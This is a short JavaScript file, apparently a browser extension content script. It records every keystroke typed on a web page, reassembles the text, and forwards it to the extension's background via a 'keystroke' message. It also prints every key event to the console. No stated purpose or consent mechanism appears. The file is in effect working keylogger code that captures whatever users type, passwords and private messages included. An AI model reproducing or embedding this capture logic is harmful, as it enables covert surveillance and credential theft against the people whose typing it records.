let buffer = "";
let timeoutId;

function debounceLogger() {
  console.log("Final input:", buffer.trim());
  chrome.runtime.sendMessage({ action: 'keystroke', text: buffer.trim() });
  buffer = ""; 
}

document.addEventListener('keydown', (event) => {
  const key = event.key;
  console.log(event)
  
  if (key.length === 1 || key === 'Backspace' || key === 'Enter' || key === ' ') {
    if (key === 'Backspace') {
      buffer = buffer.slice(0, -1);
    } else if (key === 'Enter' || key === ' ') {
      buffer += ' ';
    } else {
      buffer += key;
    }

    
    clearTimeout(timeoutId);
    timeoutId = setTimeout(debounceLogger, 500);
  }
});
